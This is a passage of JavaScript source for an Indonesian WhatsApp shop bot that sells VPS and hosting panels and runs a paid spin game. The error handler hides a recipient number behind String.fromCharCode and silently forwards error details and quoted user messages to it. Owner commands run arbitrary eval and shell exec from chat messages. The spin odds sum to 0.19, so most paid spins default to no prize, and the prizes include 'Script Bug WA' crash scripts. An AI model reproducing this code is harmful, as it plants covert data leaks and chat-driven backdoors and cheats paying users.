if (!isCreator) return m.reply(mess.owner)
if (db_saweria.length == 1) return m.reply(`Sudah login disaweria...`)
if (m.isGroup) return m.reply(mess.group)
if (!q) return reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split("@")[1]) return m.reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split(".")[1]) return m.reply(`Contoh: ${prefix+command} email@gmail.com,password`)
if (!q.split(",")[1]) return m.reply(`Contoh: ${prefix+command} email@gmail.com,password`)
await m.reply("Sedang mencoba login...")
let Pay = new Saweria(db_saweria)
let res = await Pay.login(q.split(",")[0], q.split(",")[1])
if (!res.status) return m.reply(`Terjadi kesalahan saat login:\n${res.msg}`)
await sleep(500)
await m.reply(`*LOGIN SUKSES ✅*\n\n*USER ID:* ${res.data.user_id}`)
db_saweria.push(res.data.user_id)
fs.writeFileSync("./src/saweria.json", JSON.stringify(db_saweria))
}
break
case 'batalbuy':{
if (!fs.existsSync("./src/gateway/" + m.sender.split("@")[0] + ".json")) return
yilzi.sendMessage(m.chat, { text: "Pesan telah dibatalkan." }, { quoted: m });
fs.unlinkSync("./src/gateway/" + m.sender.split("@")[0] + ".json")
}
break
case 'produk': {
  const userId = m.sender;
  try {
    // Teks utama
    let teks = `
━━━━━━━━━━━━━━━━━━━━━━━
       🚀 *SHOP BOT V5* 🚀
━━━━━━━━━━━━━━━━━━━━━━━
🎉 *Selamat datang di Yilzi Shop!*
Tempat terbaik untuk semua kebutuhan digitalmu.

Pilih opsi di bawah untuk Melihat Produk:
`;
// Sections untuk menu Panel
const sections = [{
title: "-# Produk Buypanel and Admin Panel",
rows: [{
title: "PRODUK BUYPANEL",
rowId: ".buypanel",
description: "Melihat Cara Beli Panel Dan Buy Panel"
}, {
title: "PRODUK BUY ADMIN PANEL",
rowId: ".buyadminpanel",
description: "Melihat Cara Beli Admin"
}]},
{
title: "PRODUK SPIN JACKPOT",
rows: [{
title: "SPIN JACKPOT || Harga Rp1.500",
rowId: ".spin1",
description: "Membeli Spin Jackpot"
}]},
{
title: "PRODUK SHOP",
rows: [{
title: "NOKOS WHATSAPP",
rowId: ".listnokos",
description: "Melihat Listnokos"
}, {
title: "PRODUK SCRIPT",
rowId: ".listscript",
description: "Melihat List Script"
}, { 
title: "PRODUK STOCK",
roqId: ".stock",
description: "Melihat Stock Admin"
}]},
{
title: "-# Produk Buy Vps",
rows: [{
title: "PRODUK BUY VPS",
rowId: ".buyvps",
description: "Untuk Membli Vps Dan Bakal Muncul List"
}]}];
// Pesan berbentuk list
    const listMessage = {
      text: teks,
      buttonText: "Klik Disini untuk Pilih",
      sections
    };

    // Kirim pesan
    await yilzi.sendMessage(from, listMessage, { quoted: m });
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda. Silakan coba lagi.");
  }
  break;
}
case 'buyvps': {
const userId = m.sender;
  try {
    // Teks utama
    let teks = `
╭───────────✦───────────╮
       *乂 List Paket VPS yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator X Bot : 🌟 Shop Bot V5
┃• Type  : ⚔️ Case
┃• Status: 🔥 Online
┗❐

*🌐 INFO PROFILE*
○ Pengguna : @${m.sender.split("@")[0]}
`;

    // Sections untuk menu VPS
    const sections = [
      {
        title: "Pilih List Buy VPS",
        rows: [
          {
            title: "VPS RAM 1GB CORE 1 || Harga Rp20.000",
            rowId: ".belivps 1",
            description: "© Yilzi Shop"
          },
          {
            title: "VPS RAM 2GB CORE 1 || Harga Rp35.000",
            rowId: ".belivps 2",
            description: "© Yilzi Shop"
          },
          {
            title: "VPS RAM 4GB CORE 2 || Harga Rp45.000",
            rowId: ".belivps 3",
            description: "© Yilzi Shop"
          },
          {
            title: "VPS RAM 8GB CORE 4 || Harga Rp60.000",
            rowId: ".belivps 4",
            description: "© Yilzi Shop"
          },
          {
            title: "VPS RAM 16GB CORE 4 || Harga Rp80.000",
            rowId: ".belivps 5",
            description: "© Yilzi Shop"
          }
        ]
      }
    ];

    // Pesan berbentuk list
    const listMessage = {
      text: teks,
      buttonText: "Klik Disini",
      sections
    };

    // Kirim pesan
    await yilzi.sendMessage(from, listMessage, { quoted: m });
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
  }
  break;
}
case 'buypanel': {
  const userId = m.sender;
  // Validasi username
  if (!args[0]) {
    return m.reply("Silakan berikan username untuk panel. Contoh: .buypanel <username>");
  }

  const username = args[0];

  try {
    // Teks utama
    let teks = `
╭───────────✦───────────╮
     *乂 List Paket Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator X Bot : 🌟 Shop Bot V5
┃• Type  : ⚔️ Case
┃• Status: 🔥 Online
┗❐

*🌐 INFO PROFILE*
○ Pengguna : @${m.sender.split("@")[0]}
○ Username Panel: ${username}
`;

    // Sections untuk menu Panel
    const sections = [
      {
        title: "Pilih List Buy Panel",
        rows: [
          {
            title: "RAM 1GB CPU 30% || Harga Rp2.000",
            rowId: `.belipanel ${username} 1gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 2GB CPU 60% || Harga Rp3.000",
            rowId: `.belipanel ${username} 2gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 3GB CPU 90% || Harga Rp4.000",
            rowId: `.belipanel ${username} 3gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 4GB CPU 120% || Harga Rp5.000",
            rowId: `.belipanel ${username} 4gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 5GB CPU 150% || Harga Rp6.000",
            rowId: `.belipanel ${username} 5gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 6GB CPU 180% || Harga Rp7.000",
            rowId: `.belipanel ${username} 6gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 7GB CPU 210% || Harga Rp8.000",
            rowId: `.belipanel ${username} 7gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 8GB CPU 240% || Harga Rp9.000",
            rowId: `.belipanel ${username} 8gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 9GB CPU 260% || Harga Rp10.000",
            rowId: `.belipanel ${username} 9gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM 10GB CPU 270% || Harga Rp11.000",
            rowId: `.belipanel ${username} 10gb`,
            description: "© Yilzi Shop"
          },
          {
            title: "RAM UNLI CPU UNLI || Harga Rp15.000",
            rowId: `.belipanel ${username} unli`,
            description: "© Yilzi Shop"
          }
        ]
      }
    ];

    // Pesan berbentuk list
    const listMessage = {
      text: teks,
      buttonText: "Klik Disini",
      sections
    };

    // Kirim pesan
    await yilzi.sendMessage(from, listMessage, { quoted: m });
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
  }
  break;
}
case 'spin1': {
try {
// Fungsi Pilih Hadiah dengan Probabilitas
function pilihHadiah(hadiahPool) {
const rand = Math.random();
let cumulativeProbability = 0;

for (const item of hadiahPool) {
cumulativeProbability += item.probabilitas;
if (rand <= cumulativeProbability) {
return item;
}
}
return hadiahPool[0]; // Default ke hadiah pertama jika ada kesalahan
}

// Definisi Pool Hadiah Lengkap
const hadiahPool = [
{ 
kategori: "Zonk", 
hadiah: "Tidak ada hadiah", 
poin: 3, 
probabilitas: 0.07,
notifikasi: "⚪ Anda tidak mendapatkan hadiah kali ini." 
},
{ 
kategori: "Lucky", 
hadiah: "Rp 2.000", 
poin: 5, 
probabilitas: 0.02,
notifikasi: "🫱🟣🫲 Selamat! Anda mendapatkan hadiah uang tunai Rp 2.000!" 
},
{ 
kategori: "AI", 
hadiah: "Script AI Bot", 
poin: 20, 
probabilitas: 0.06,
notifikasi: "🫱🟢🫲 Selamat! Anda mendapatkan *Script AI Bot*! Ketik *.claimhadiah1* untuk klaim hadiah." 
},
{ 
kategori: "Bug", 
hadiah: "Script Bug WA", 
poin: 20, 
probabilitas: 0.03,
notifikasi: "🫱🔴🫲 Selamat! Anda mendapatkan *Script Bug WA*! Ketik *.claimhadiah2* untuk klaim hadiah." 
},
{ 
kategori: "Mega Win", 
hadiah: "Rp 8.000", 
poin: 50, 
probabilitas: 0.01,
notifikasi: "🌟✨ *MEGA WIN!* ✨🌟 Selamat! Anda mendapatkan hadiah uang tunai Rp 8.000 dan 50 poin!" 
}
];

// Perhitungan biaya spin
const spinPrice = 1500;
const randomAdditional = Math.floor(Math.random() * (250 - 110 + 1)) + 110;
const amount = spinPrice + randomAdditional;

// Proses pembayaran jika saldo tidak cukup
if (fs.existsSync(`./src/gateway/${m.sender.split("@")[0]}.json`)) {
return await yilzi.sendMessage(m.chat, {
text: `⚠️ *Proses spin sebelumnya belum selesai!*\n\nKetik *${prefix}batalbeli* untuk membatalkan.`
});
}

// Buat QR Saweria
let Pay = new Saweria(db_saweria);
const expirationTime = new Date(Date.now() + 10 * 60 * 1000);
let res = await Pay.createPayment(amount, `Spin - ${amount}`, {
expired_at: expirationTime.toISOString(),
});

if (!res.status) {
return await yilzi.sendMessage(m.chat, {
text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${res.msg}`
});
}

// Simpan informasi pembayaran
fs.writeFileSync(`./src/gateway/${m.sender.split("@")[0]}.json`, JSON.stringify({
number: m.sender,
id: res.data.id,
expiredAt: expirationTime.toISOString(),
}, null, 3));

// Kirim QR pembayaran
const teks = `
📄 *INFO PEMBAYARAN SPIN*

🎮 *Permainan*: Spin
💰 *Total Pembayaran*: Rp ${amount.toLocaleString("id-ID")}
📆 *Batas Waktu*: ${expirationTime.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB
🆔 *ID Pembayaran*: ${res.data.id}

📌 *Catatan*: 
1️⃣ QR berlaku hanya untuk 1 kali transfer.
2️⃣ QR akan kedaluwarsa dalam 10 menit.
3️⃣ Setelah transfer, tunggu beberapa saat hingga status diperbarui otomatis.

🛑 Jika ingin membatalkan, ketik *${prefix}batalbeli*.
📞 Untuk bantuan, hubungi *${prefix}owner*.
`;

await yilzi.sendMessage(
m.chat,
{
image: Buffer.from(res.data.qr_image.split(",")[1], "base64"),
caption: teks,
},
{ quoted: m }
);

// Proses pengecekan pembayaran
let status = false;
const maxAttempts = 600;
let attempts = 0;

while (!status && attempts < maxAttempts) {
await sleep(1000);
attempts++;

if (new Date() > expirationTime) {
fs.unlinkSync(`./src/gateway/${m.sender.split("@")[0]}.json`);
return await yilzi.sendMessage(m.chat, {
text: `❌ *Waktu pembayaran habis.*\nSilakan coba lagi.`,
});
}

let check = await Pay.checkPayment(res.data.id);
status = check.status;

if (status) {
fs.unlinkSync(`./src/gateway/${m.sender.split("@")[0]}.json`);
await yilzi.sendMessage(m.chat, {
text: `✅ *Pembayaran Berhasil melalui QRIS!*\n\n🎮 Memulai Spin Anda...`,
});
break;
}
}

if (!status) {
return await yilzi.sendMessage(m.chat, {
text: `❌ Pembayaran tidak selesai dalam waktu 10 menit. Silakan coba lagi.`,
});
}
// Animasi Spin
const animasi = ["⚫🟤🟣🔵", "⬛🟫🟪🟦", "🟥🟠🟨🟢", "🟧🟩⚪🔴"];
let spinCount = Math.floor(Math.random() * (10 - 7 + 1)) + 7;
let spinMsg;
for (let i = 0; i < spinCount; i++) {
for (const frame of animasi) {
if (!spinMsg) {
spinMsg = await yilzi.sendMessage(m.chat, { text: frame });
} else {
await yilzi.sendMessage(m.chat, { text: frame, edit: spinMsg.key });
}
await sleep(400);
}
}

// Pilih Hadiah
const hasil = pilihHadiah(hadiahPool);

// Buat Teks Hasil
const now = new Date();
const tanggal = now.toLocaleDateString('id-ID');
const waktu = now.toLocaleTimeString('id-ID');
let hasilText = `
🎰 *HASIL SPIN*

📅 *Tanggal*: ${tanggal}
⏰ *Waktu*: ${waktu}
📱 *Pemain*: ${m.sender}
🎮 *Permainan*: Spin
🎁 *Hadiah*: ${hasil.hadiah}
🏅 *Poin*: ${hasil.poin}

${hasil.notifikasi}

✨ *Terima kasih telah bermain di Yilzi Shop!* ✨
`;

if (hasil.kategori === "AI") {
hasilText += `\n📌 *Instruksi*: Ketik *.claimhadiah1* untuk klaim Script AI.`;
}

if (hasil.kategori === "Bug") {
hasilText += `\n📌 *Instruksi*: Ketik *.claimhadiah2* untuk klaim Script Bug.`;
}

await yilzi.sendMessage(m.chat, { text: hasilText });

// Notifikasi ke Owner untuk Hadiah Besar
if (hasil.kategori === "Mega Win" || hasil.kategori === "Lucky") {
const ownerNumber = "6282245415403@s.whatsapp.net";
const ownerText = `
📢 *NOTIFIKASI HADIAH SPIN*

📱 *Pemain*: ${m.sender}
🎮 *Permainan*: Spin
🎁 *Hadiah*: ${hasil.hadiah}
🏅 *Poin*: ${hasil.poin}
📆 *Tanggal*: ${tanggal}
⏰ *Waktu*: ${waktu}

⚡ *Mohon segera proses hadiah untuk pemain ini!*`;
await yilzi.sendMessage(ownerNumber, { text: ownerText });
}

} catch (error) {
console.error("Error Spin:", error);
await yilzi.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat memproses hasil Spin. Silakan coba lagi nanti." });
}
break;
}
case "listscript": {
m.reply(`*🎉 Fitur List Script Hanya Tersedia Di Script Yilzi Shop V6*`)
}
break
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
yilzi.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});